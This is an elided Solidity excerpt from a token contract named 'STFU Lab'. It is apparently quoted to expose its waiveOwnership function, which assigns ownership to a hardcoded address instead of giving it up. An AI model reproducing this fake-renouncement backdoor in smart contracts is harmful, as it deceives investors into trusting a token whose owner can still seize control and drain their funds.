...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x7DA2C9d473ca50892cA19E9C6457dd4882185665);
    }
...
contract StfuLab is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "STFU Lab";
    string private _symbol = "STFUL";
